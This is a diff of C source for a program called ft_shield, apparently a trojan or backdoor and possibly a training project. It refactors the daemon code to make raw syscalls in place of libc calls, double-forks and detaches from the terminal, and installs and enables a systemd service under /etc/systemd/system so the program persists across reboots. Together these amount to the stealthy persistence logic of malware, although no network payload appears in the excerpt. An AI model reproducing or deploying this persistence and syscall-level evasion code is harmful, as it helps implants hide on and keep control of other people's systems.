@@ -4,13 +4,10 @@
 int log_fd;
 
 void close_fds() {
-    if (sc(SYS_close_range, 4, ~0U, 0) == -1) {
-        perror("close_range");
-        exit(EXIT_FAILURE);
-    }
+    sc(SYS_close_range, 4, ~0U, 0);
 }
 
-void set_persistance() {
+void set_persistence() {
     const char *path = "/etc/systemd/system/ft_shield.service";
     int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
     if (fd < 0) {
@@ -20,7 +17,7 @@ void set_persistance() {
     } else {
         write(log_fd, "service file created\n", 22);
     }
-    write(fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));
+    sc(SYS_write, fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));
 
     system("systemctl daemon-reexec");
     system("systemctl enable /etc/systemd/system/ft_shield.service");
@@ -46,7 +43,7 @@ void handle_lock(int mod) {
     if (mod == LOCK) {
         if (sc(SYS_flock, fd, LOCK_EX | LOCK_NB) == -1) {
             sc(SYS_close, fd);
-            exit(EXIT_FAILURE);
+            sc(SYS_exit, EXIT_FAILURE);
         }
     } else {
         sc(SYS_flock, fd, LOCK_UN);
@@ -60,22 +57,22 @@ void create_daemon() {
     log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
 
     if (pid < 0)
-        exit(EXIT_FAILURE);
+        sc(SYS_exit, EXIT_FAILURE);
     if (pid > 0)
-        exit(EXIT_SUCCESS); // Quitter le parent
+        sc(SYS_exit, EXIT_SUCCESS); // Quitter le parent
     // nouvelle session
     if (sc(SYS_setsid) < 0)
-        exit(EXIT_FAILURE);
+        sc(SYS_exit, EXIT_FAILURE);
 
     // deuxième fork pour s'assurer que le démon ne peut jamais réaquérir un terminal
     pid = sc(SYS_fork);
     if (pid < 0)
-        exit(EXIT_FAILURE);
+        sc(SYS_exit, EXIT_FAILURE);
     if (pid > 0)
-        exit(EXIT_SUCCESS);
+        sc(SYS_exit, EXIT_SUCCESS);
     close_fds();
     reset_signals();
-    set_persistance();
+    set_persistence();
     write(log_fd, "persistence set\n", 17);
     handle_lock(LOCK);
     write(log_fd, "lock set\n", 10);
